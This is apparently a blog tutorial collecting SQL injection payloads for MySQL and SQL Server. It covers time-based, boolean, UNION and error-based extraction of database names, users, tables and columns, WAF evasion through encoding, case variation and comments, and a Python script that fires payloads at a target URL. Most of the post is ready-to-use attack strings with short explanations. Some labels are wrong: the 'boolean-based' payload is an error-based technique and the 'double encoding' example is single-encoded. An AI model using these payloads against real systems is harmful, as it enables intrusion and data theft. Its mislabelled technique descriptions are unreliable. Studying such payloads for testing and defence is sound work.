---
title: "Other Advanced SQLi Payloads"
tags: ['Hacking', 'SQLi']
date: 2024-10-03
toc: true
unlisted: true
author: 'Ren'
authorlink: 'https://about.0x0060.dev/'
---


## 1. Time-Based Blind SQL Injection with Complex Payloads

Time-based blind SQL injection relies on database responses based on time delays. This method is effective when the application does not return visible errors.

### Payload:

```  
' AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>77,SLEEP(5),0)--  
```

### Explanation:

This payload uses conditional statements to delay the response if the first character of the database name is greater than 'M'. It helps in extracting data one character at a time.

#### How it Works:

- **ORD()** function converts the character to its ASCII value.
- **MID()** function extracts a substring from the result of the subquery.
- **IF()** conditionally delays the response using **SLEEP()** based on the ASCII value.
  
This payload is injected into a vulnerable parameter, causing the application to delay its response if the condition is true, helping to infer the value of the character.

## 2. Boolean-Based Blind SQL Injection with Large Payloads

Boolean-based blind SQL injection exploits true or false conditions in SQL queries to extract information.

### Payload:

```  
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT (SELECT CONCAT(0x7e,0x27, DATABASE(), 0x27,0x7e)) FROM information_schema.tables LIMIT 1,1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--  
```

### Explanation:

This payload uses a subquery to concatenate the database name with special characters and group by a random value, forcing the database to return a specific result.

#### How it Works:

- **COUNT(*)** counts the number of rows returned.
- **CONCAT()** concatenates the database name with special characters.
- **RAND()** generates a random number.
- **GROUP BY** forces the query to execute the subquery, leading to an error if the condition is false.

This payload helps in extracting information by observing the application's behavior based on the boolean condition.

## 3. Union-Based SQL Injection with Multiple Statements

### Payload:

```  
' UNION ALL SELECT NULL, CONCAT_WS(CHAR(58,45,45,58), user(), database(), version()), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL  
```

## 4. Error-Based SQL Injection with Advanced Payloads

Error-based SQL Injection relies on the database to generate errors that reveal information about the database structure and content. By crafting payloads that force the database to produce error messages, attackers can extract valuable data.

### Payload:

```  
' AND 1=CONVERT(int, (SELECT @@version))--  
```

### Explanation:

This payload forces the database to convert a string value into an integer, generating an error that includes the database version. By manipulating the payload, attackers can retrieve different pieces of information from the error messages.

#### How it Works:

- The **CONVERT()** function attempts to change the database version string into an integer.
- This causes an error, as the version string cannot be converted to an integer.
- The error message reveals the database version.

### Example Use Case:

```  
' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--  
```

This payload generates an error revealing table names from the information_schema.tables.

## WAF Bypass Techniques

WAFs (Web Application Firewalls) often block common SQL injection patterns. Advanced techniques are required to bypass these defenses.

### Double Encoding

### Payload:

```  
%27%20AND%201=1%20--%20  
```

### Explanation:

This payload uses double URL encoding to bypass WAF filters that only decode input once.

### Case Variation

### Payload:

```  
' aND 1=1 --  
```

### Explanation:

This payload uses mixed case to evade case-sensitive WAF filters.

### Comment Obfuscation

### Payload:

```  
'/**/AND/**/1=1--  
```

### Explanation:

This payload inserts comments between keywords to bypass simplistic pattern matching filters.

## Automating SQL Injection with Python

Automating SQL Injection can save time and increase efficiency. Python, with its versatile libraries, is an excellent choice for creating automated tools.

### Sample Python Script for Automating SQL Injection

### Script:

```
import requests  

def sqli_test(url, payload):  
    full_url = f"{url}{payload}"  
    response = requests.get(full_url)  
    return response.text  

def main():  
    url = 'http://example.com/vulnerable_page.php?id='  
    payloads = [  
        "' AND 1=1 -- ",  
        "' AND 1=2 -- ",  
        "' UNION SELECT NULL, CONCAT_WS(CHAR(58,45,45,58), user(), database(), version()), NULL -- "  
    ]  

    for payload in payloads:  
        result = sqli_test(url, payload)  
        if "error" in result or "You have an error in your SQL syntax" in result:  
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")  
            print(result)  

if __name__ == "__main__":  
    main()  
```

### Explanation:

- The script defines a function **sqli_test()** to send HTTP GET requests with SQLi payloads.
- The **main()** function iterates over a list of payloads, sending each to the target URL.
- The script checks the response for typical SQL error messages, indicating a potential vulnerability.

## Appendix: Additional Payloads and Resources

### Additional Payloads

- **Extracting Database Users:**

```  
' UNION SELECT NULL, user() --  
```

- **Extracting Table Names:**

```  
' UNION SELECT NULL, table_name FROM information_schema.tables --  
```

- **Extracting Column Names:**

```  
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --  
```